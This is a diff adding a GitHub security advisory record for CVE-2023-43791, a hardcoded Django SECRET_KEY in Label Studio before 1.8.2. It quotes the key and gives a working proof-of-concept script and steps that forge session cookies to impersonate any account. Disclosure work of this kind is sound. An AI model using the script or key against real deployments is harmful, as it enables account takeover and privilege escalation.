@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-f475-x83m-rx5m",
+  "modified": "2023-11-09T16:46:25Z",
+  "published": "2023-11-09T14:42:58Z",
+  "aliases": [
+    "CVE-2023-43791"
+  ],
+  "summary": "Label Studio has Hardcoded Django `SECRET_KEY` that can be Abused to Forge Session Tokens",
+  "details": "# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "label-studio"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.8.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43791"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/pull/4690"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/HumanSignal/label-studio"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/releases/tag/1.8.2"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-200"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-11-09T14:42:58Z",
+    "nvd_published_at": "2023-11-09T15:15:08Z"
+  }
+}
